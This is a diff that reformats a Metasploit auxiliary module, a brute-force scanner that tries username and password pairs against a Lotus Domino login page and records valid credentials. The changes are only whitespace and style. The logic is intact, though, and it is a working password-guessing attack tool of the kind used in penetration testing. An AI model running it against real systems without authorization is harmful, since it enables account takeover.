@@ -9,23 +9,19 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
-      'Name'           => 'Lotus Domino Brute Force Utility',
-      'Description'    => 'Lotus Domino Authentication Brute Force Utility',
-      'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
-      'License'        =>  MSF_LICENSE
+      'Name' => 'Lotus Domino Brute Force Utility',
+      'Description' => 'Lotus Domino Authentication Brute Force Utility',
+      'Author' => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+      'License' => MSF_LICENSE
     )
-
   end
 
   def run_host(ip)
-
     each_user_pass { |user, pass|
       do_login(user, pass)
     }
-
   end
 
   def report_cred(opts)
@@ -55,16 +51,15 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def do_login(user=nil,pass=nil)
+  def do_login(user = nil, pass = nil)
     post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"
     vprint_status("http://#{vhost}:#{rport} - Lotus Domino - Trying username:'#{user}' with password:'#{pass}'")
 
     begin
-
       res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => '/names.nsf?Login',
-        'data'    => post_data,
+        'method' => 'POST',
+        'uri' => '/names.nsf?Login',
+        'data' => post_data,
       }, 20)
 
       if res and res.code == 302
@@ -91,9 +86,8 @@ class MetasploitModule < Msf::Auxiliary
         print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized #{res.code} response") if res
         return :abort
       end
-
-      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      rescue ::Timeout::Error, ::Errno::EPIPE
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
 end
